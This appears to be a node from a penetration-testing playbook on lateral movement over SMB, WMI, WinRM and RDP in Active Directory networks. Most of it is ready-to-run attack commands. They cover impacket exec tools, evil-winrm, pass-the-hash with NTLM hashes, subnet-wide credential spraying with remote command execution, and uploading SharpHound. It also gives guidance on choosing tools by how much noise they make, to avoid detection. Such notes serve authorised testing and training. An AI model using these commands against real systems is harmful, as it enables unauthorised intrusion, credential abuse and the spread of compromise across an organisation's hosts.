---
id: smb-lateral-movement
title: SMB Lateral Movement
stage: foothold
tags: [windows, smb, ad]
summary: Move laterally using plaintext credentials or hashes over SMB, WMI, or DCOM — choose the tool based on noise level and what ports are open on the target.
leads_to:
  - token-impersonation
  - windows-stored-creds
  - bloodhound
---

## Prerequisites

Valid credentials (plaintext or NTLM hash) for an account with local admin rights on the target. SMB port 445 open, or WMI (135+dynamic) for wmiexec. If you have a hash use pass-the-hash directly — this node is for credential-based lateral movement (plaintext password you've obtained or a hash you want to use for shell access across multiple hosts).

Lateral movement over SMB is the most common path in AD environments after obtaining credentials. The tool choice affects noise: psexec writes a service binary (loud, creates event logs), wmiexec uses WMI (quieter, runs as target user), smbexec uses SCM without dropping a binary (medium), atexec uses Task Scheduler. Always try wmiexec first.

## Quick Win

> wmiexec with plaintext — semi-interactive shell, quieter than psexec.

```bash
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
impacket-wmiexec $USER:$PASS@$TARGET  # local account
```

## Tool Priority

```bash
# 1. evil-winrm (best interactive shell, port 5985)
evil-winrm -i $TARGET -u $USER -p $PASS

# 2. wmiexec (WMI, port 135, semi-interactive)
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET

# 3. smbexec (SCM, port 445, no binary drop)
impacket-smbexec $DOMAIN/$USER:$PASS@$TARGET

# 4. psexec (noisiest, drops binary, triggers AV)
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET

# 5. atexec (task scheduler, fire-and-forget)
impacket-atexec $DOMAIN/$USER:$PASS@$TARGET "whoami"
```

## With Hash (Pass-the-Hash)

```bash
evil-winrm -i $TARGET -u $USER -H $NTLM
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$NTLM
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

## Spray Across Subnet

```bash
# Find all hosts where credentials are valid
nxc smb 192.168.x.0/24 -u $USER -p $PASS
nxc smb 192.168.x.0/24 -u $USER -H $NTLM --local-auth

# Execute command on all valid targets
nxc smb 192.168.x.0/24 -u $USER -p $PASS -x "whoami"
```

## RDP with Credentials

```bash
xfreerdp /u:$USER /p:$PASS /v:$TARGET /cert-ignore
xfreerdp /u:$USER /pth:$NTLM /v:$TARGET /cert-ignore  # hash
```

## File Transfer for Tooling

```bash
# Upload SharpHound or other tools via SMB
smbclient //$TARGET/C$ -U $USER%$PASS
smbclient //$TARGET/C$ -U $USER%$PASS -c "put SharpHound.exe Windows\\Temp\\SharpHound.exe"

# Download via evil-winrm
download C:\path\to\file
```

## Leads To

Shell on new host → `whoami /priv` → token-impersonation if SeImpersonatePrivilege. Shell → enumerate credential stores (Credential Manager, registry, unattend.xml) → windows-stored-creds. New context → run SharpHound with new account for updated BloodHound picture → bloodhound. Service account shell → check SPNs and delegation settings.
